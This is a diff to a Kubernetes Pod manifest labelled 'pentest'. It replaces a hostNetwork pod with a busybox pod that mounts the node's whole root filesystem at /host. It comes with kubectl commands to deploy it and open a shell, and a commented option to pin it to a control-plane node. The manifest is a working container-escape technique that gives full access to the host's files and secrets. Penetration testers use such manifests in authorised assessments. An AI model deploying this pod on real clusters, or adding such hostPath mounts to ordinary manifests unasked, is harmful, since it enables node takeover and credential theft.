@@ -1,20 +1,26 @@
 ###########################################################
-## Deploy: kubectl -n [namespace] apply -f pod-hostnetwork-only.yaml 
-## Access: kubectl -n [namespace] exec -it pod-hostnetwork -- bash
-## Remove: kubectl -n [namespace] delete -f pod-hostnetwork-only.yaml
+## Deploy: kubectl -n [namespace] apply -f pod-hostpath.yaml 
+## Access: kubectl -n [namespace] exec -it pod-hostpath -- bash
+## Remove: kubectl -n [namespace] delete pod-hostpath
 ###########################################################
 apiVersion: v1
 kind: Pod
 metadata:
-  name: pod-hostnetwork
+  name: pod-hostpath
   labels:
     app: pentest
 spec:
-  hostNetwork: true
   containers:
-  - image: ubuntu
+  - name: hostpath
+    image: busybox
+    volumeMounts:
+    - mountPath: /host
+      name: noderoot
     command: [ "/bin/sh", "-c", "--" ]
     args: [ "while true; do sleep 30; done;" ]
-    name: hostnetwork
   # Force scheduling of your pod on control plane node by uncommenting this line and changing the name
   #nodeName: k8s-control-plane-node
+  volumes:
+  - name: noderoot
+    hostPath:
+      path: /
